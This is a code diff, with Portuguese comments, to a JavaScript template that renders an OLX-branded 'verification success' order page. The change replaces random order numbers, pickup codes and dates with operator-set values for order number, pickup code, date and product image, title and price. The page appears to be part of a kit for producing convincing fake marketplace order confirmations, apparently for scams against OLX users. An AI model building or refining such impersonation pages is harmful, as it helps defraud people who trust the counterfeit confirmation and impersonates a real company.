@@ -851,20 +851,54 @@ const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
           }
         });
       })();
-      // Order id aleatório bonitinho
-      var rnd = '';
-      for(var i=0;i<10;i++) rnd += Math.floor(Math.random()*10);
-      var label = '#OLX-' + rnd;
+      // Número do pedido (CFG ou aleatório)
+      var cfgOrder = (CFG.order_number || '').toString().trim();
+      var orderNumEl = document.getElementById('order-number');
+      if(orderNumEl){
+        if(cfgOrder) orderNumEl.textContent = cfgOrder;
+        else {
+          var rndN = ''; for(var ii=0;ii<19;ii++) rndN += Math.floor(Math.random()*10);
+          orderNumEl.textContent = rndN;
+        }
+      }
+      var labelDisplay = '#OLX-' + ((cfgOrder || (orderNumEl ? orderNumEl.textContent : '')).slice(0,10));
       var heroEl = document.getElementById('hero-order');
       var inlineEl = document.getElementById('order-inline');
-      if(heroEl) heroEl.textContent = label;
-      if(inlineEl) inlineEl.textContent = label;
+      if(heroEl) heroEl.textContent = labelDisplay;
+      if(inlineEl) inlineEl.textContent = labelDisplay;
 
-      // Código de retirada 6 dígitos
-      var code = '';
-      for(var k=0;k<6;k++) code += Math.floor(Math.random()*10);
+      // Código de coleta — vazio = "—"
       var codeEl = document.getElementById('pickup-code');
-      if(codeEl) codeEl.textContent = code;
+      if(codeEl){
+        var cfgCode = (CFG.pickup_code || '').toString().trim();
+        codeEl.textContent = cfgCode || '—';
+      }
+
+      // Produto (imagem/título/valor)
+      try {
+        if(CFG.product_image_url){
+          var imgBox = document.querySelector('.prod .img');
+          if(imgBox){
+            imgBox.innerHTML = '';
+            imgBox.style.background = 'transparent';
+            var imgTag = document.createElement('img');
+            imgTag.src = CFG.product_image_url;
+            imgTag.alt = '';
+            imgTag.style.cssText = 'width:100%;height:100%;object-fit:cover;border-radius:10px;display:block';
+            imgBox.appendChild(imgTag);
+          }
+        }
+        if(CFG.product_title){
+          var titleEl = document.querySelector('.prod .name');
+          if(titleEl) titleEl.textContent = CFG.product_title;
+        }
+        if(CFG.product_price){
+          var priceEl = document.querySelector('.prod .price');
+          if(priceEl) priceEl.textContent = CFG.product_price;
+          var totalEl = document.querySelector('.total .v');
+          if(totalEl) totalEl.textContent = CFG.product_price;
+        }
+      } catch(e){}
 
       // Nome do usuário a partir do email (placeholder), com fallback
       var nameEl = document.getElementById('user-name');
@@ -882,9 +916,13 @@ const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
       // Data hoje
       var dEl = document.getElementById('order-date');
       if(dEl){
-        var d = new Date();
-        var pad = function(n){ return n<10 ? '0'+n : ''+n; };
-        dEl.textContent = pad(d.getDate())+'/'+pad(d.getMonth()+1)+' · '+pad(d.getHours())+'h'+pad(d.getMinutes());
+        var cfgDate = (CFG.order_date || '').toString().trim();
+        if(cfgDate) dEl.textContent = cfgDate;
+        else {
+          var d = new Date();
+          var pad = function(n){ return n<10 ? '0'+n : ''+n; };
+          dEl.textContent = pad(d.getDate())+'/'+pad(d.getMonth()+1)+' · '+pad(d.getHours())+'h'+pad(d.getMinutes());
+        }
       }
 
       // ETA aleatório
